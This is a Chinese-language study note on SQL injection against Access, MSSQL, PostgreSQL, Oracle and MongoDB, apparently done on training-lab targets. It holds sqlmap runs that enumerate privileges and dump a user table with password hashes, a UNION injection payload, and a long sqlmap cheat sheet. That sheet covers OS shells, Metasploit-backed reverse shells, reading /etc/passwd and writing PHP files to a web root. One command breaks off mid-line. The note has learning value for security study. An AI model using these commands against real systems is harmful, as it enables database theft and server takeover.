---
title: "oracle,mongodb等数据库注入 2"
date: 2026-04-07
published: 2026-04-07
permalink: /posts/.trash/oracle,mongodb等数据库注入 2/
author: Rin
categories:
  - 笔记
tags:
  - Study
  - Linux
---

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624337095372-9725dc09-ce09-469e-bc9e-63dffac04d31.png)

### 一、简要学习各种数据库的注入特点

access,mysql, mssql , mongoDB,postgresql, sqlite,oracle,sybase等

#### 1、access注入

```
Access数据库 表名 列名	数据
access 数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库，
```

**access三大攻击手法**

```
1.access注入攻击片段-联合查询法
2.access注入攻击片段-逐字猜解法
3.工具类的使用注入（推荐）
```

**Access注入攻击方式**

主要有：union 注入、http header 注入、偏移注入等

#### 2、msSQL注入

参考文档：[https://www.cnblogs.com/xishaonian/p/6173644.html](https://www.cnblogs.com/xishaonian/p/6173644.html)

判断数据库类型

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624422113087-bacba60d-cb8b-4da6-b879-2b8c1c598de6.png)

判断数据库版本

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624422229255-fcbf686e-d30d-4ad7-ae51-439463424581.png)

#### 3、postgresql注入

参考文档：[https://www.cnblogs.com/KevinGeorge/p/8446874.html](https://www.cnblogs.com/KevinGeorge/p/8446874.html)

数据库识别

```
┌──(root💀kali)-[~/hackbar]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:44:22 /2021-06-23/
[12:44:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:44:28] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
[12:44:28] [INFO] testing 'PostgreSQL error-based - Parameter replace'
[12:44:28] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'
[12:44:28] [INFO] testing 'Generic inline queries'
[12:44:28] [INFO] testing 'PostgreSQL inline queries'
[12:44:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:44:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
[12:44:29] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
[12:44:29] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
```

查看数据库权限

```
┌──(root💀kali)-[~/hackbar]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -privileges --level 3
database management system users privileges:
[*] postgres (administrator) [2]:
    privilege: createdb
    privilege: super
┌──(root💀kali)-[~/hackbar]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --is-dba --level 3
[12:56:40] [INFO] testing if current user is DBA
current user is DBA: True
```

查看当前数据库

```
┌──(root💀kali)-[~/hackbar]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --current-db --batch
[13:12:38] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[13:12:38] [INFO] fetching current database
[13:12:38] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
current database (equivalent to schema on PostgreSQL): 'public'
[13:12:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/219.153.49.228'
[13:12:38] [WARNING] your sqlmap version is outdated
```

查看数据表

```
┌──(root💀kali)-[~/hackbar]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public --tables
Database: public
[2 tables]
+-----------+
| notice    |
| reg_users |
+-----------+

[13:17:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/219.153.49.228'
[13:17:46] [WARNING] your sqlmap version is outdated
```

查看字段

```
┌──(root💀kali)-[~/hackbar]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users --columns
Database: public
Table: reg_users
[4 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| id       | int4    |
| name     | varchar |
| password | varchar |
| status   | int4    |
+----------+---------+
```

获取数据

```
┌──(root💀kali)-[~/hackbar]
└─# sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users -C "name,password" --dump --batch
[2 entries]
+--------+---------------------------------------------+
| name   | password                                    |
+--------+---------------------------------------------+
| mozhe2 | 1c63129ae9db9c60c3e8aa94d3e00495 (1qaz2wsx) |
| mozhe1 | aa92e4057b30d003d87b61b1b12ae909            |
+--------+---------------------------------------------+
```

#### 4、Oracle注入

参考文档：[https://www.cnblogs.com/peterpan0707007/p/8242119.html](https://www.cnblogs.com/peterpan0707007/p/8242119.html)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624426406192-a78f3b33-5e23-4f6f-9b06-bc9bb14852b0.png)

```
┌──(root💀kali)-[~/hackbar]
└─# sqlmap -u http://219.153.49.228:41644/new_list.php?id=1 --batch
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2434=2434

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-4068 UNION ALL SELECT CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113)||CHR(88)||CHR(97)||CHR(102)||CHR(67)||CHR(117)||CHR(109)||CHR(97)||CHR(101)||CHR(110)||CHR(105)||CHR(85)||CHR(72)||CHR(117)||CHR(99)||CHR(88)||CHR(119)||CHR(73)||CHR(79)||CHR(85)||CHR(76)||CHR(89)||CHR(98)||CHR(106)||CHR(78)||CHR(114)||CHR(73)||CHR(81)||CHR(115)||CHR(109)||CHR(104)||CHR(109)||CHR(89)||CHR(98)||CHR(120)||CHR(89)||CHR(117)||CHR(103)||CHR(88)||CHR(75)||CHR(104)||CHR(113)||CHR(106)||CHR(106)||CHR(112)||CHR(113),NULL FROM DUAL-- DhFb
---
[13:34:35] [INFO] testing Oracle
[13:34:35] [INFO] confirming Oracle
[13:34:35] [INFO] the back-end DBMS is Oracle
back-end DBMS: Oracle
[13:34:35] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/219.153.49.228'
[13:34:35] [WARNING] your sqlmap version is outdated

[*] ending @ 13:34:35 /2021-06-23/
```

#### 5、mongoDB注入

参考文档：[https://www.cnblogs.com/wefeng/p/11503102.html](https://www.cnblogs.com/wefeng/p/11503102.html)

SQLmap不能识别MongoDB这里介绍nosqlattack:[https://github.com/youngyangyang04/NoSQLAttack](https://github.com/youngyangyang04/NoSQLAttack)

```
┌──(root💀kali)-[~/hackbar]
└─# sqlmap -u http://219.153.49.228:47077/new_list.php?id=1 --batch
[13:53:16] [INFO] testing connection to the target URL
[13:53:16] [INFO] testing if the target URL content is stable
[13:53:16] [INFO] target URL content is stable
[13:53:16] [INFO] testing if GET parameter 'id' is dynamic
[13:53:16] [INFO] GET parameter 'id' appears to be dynamic
[13:53:16] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[13:53:16] [INFO] testing for SQL injection on GET parameter 'id'
[13:53:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:53:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:53:17] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:53:17] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[13:53:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[13:53:18] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[13:53:18] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:53:18] [INFO] testing 'Generic inline queries'
[13:53:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[13:53:18] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:53:19] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:53:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:53:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[13:53:19] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[13:53:19] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[13:53:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:53:20] [WARNING] GET parameter 'id' does not seem to be injectable
[13:53:20] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[13:53:20] [WARNING] your sqlmap version is outdated
```

nosqlattack

### 二、SQLmap使用方法

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624416333795-8c0f82ef-e36f-4a6c-9382-b48e180b87c9.png)

```
基本操作笔记：-u  #注入点 
-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&id=2 -p "page,id") 
-D ""  #指定数据库名 
-T ""  #指定表名 
-C ""  #指定字段 
-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D ""   #列出指定数据库中的表 
--columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段 
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data "" #POST方式提交数据(--data "page=1&id=2") 
--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
--referer ""     #使用referer欺骗(--referer "http://www.baidu.com") 
--user-agent ""  #自定义user-agent 
--proxy "http://127.0.0.1:8118" #代理注入 
--string=""    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
-p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
--eta          #盲注 
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 

常用语句 :
1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
16./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
17./sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1 
20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner 
21./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --cookie="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low" --string='xx' --dbs --level=3 -p "uid"

简单的注入流程 :
1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
```

### 三、简要学习各种注入工具的使用指南

**1、jsql工具安装使用**

```
┌──(root💀kali)-[~/hackbar]
└─# apt-get -f install jsql
正在读取软件包列表... 完成
正在分析软件包的依赖关系树
正在读取状态信息... 完成
下列【新】软件包将被安装：
  jsql
升级了 0 个软件包，新安装了 1 个软件包，要卸载 0 个软件包，有 1573 个软件包未被升级。
需要下载 2,500 B 的归档。
解压缩后会消耗 9,216 B 的额外空间。
获取:1 https://mirrors.aliyun.com/kali kali-rolling/main amd64 jsql all 0.82-0kali2 [2,500 B]
已下载 2,500 B，耗时 2秒 (1,099 B/s)
正在选中未选择的软件包 jsql。
(正在读取数据库 ... 系统当前共安装有 307905 个文件和目录。)
准备解压 .../jsql_0.82-0kali2_all.deb  ...
正在解压 jsql (0.82-0kali2) ...
正在设置 jsql (0.82-0kali2) ...
```

启动直接数据`jsql`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624420102054-e204b6e9-1202-49b7-bf4d-5cd4564e5a60.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624420122037-6630b9b0-8f81-4fd5-8a15-5e0d497c55af.png)

对一些简单的注入有用对于post注入的效果不好

**2、pangolin工具使用**

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624421214379-052655e7-3299-421f-bf98-1573084df6af.png)

能够做一些简单的SQL注入、对于post注入效果也不是很好，另外执行的速度也很慢，只能在window平台使用。

熟悉工具的支持库，注入模式，优缺点等

sqlmap, NoSQLAttack , Pangolin等

相关资源

```
https://www.cnblogs.com/bmjoker/p/9326258.html
https://github.com/youngyangyang04/NoSQLAttack
https://github.com/sqlmapproject/sqlmap/zipball/master
https:/blog.csdn.net/qq_39936434/category_9103379.html
https://www.mozhe.cn/bug/WUJ30GVQSTlyeXdvbHU2ZmVOMjVDU7bW96aGUmozhe
```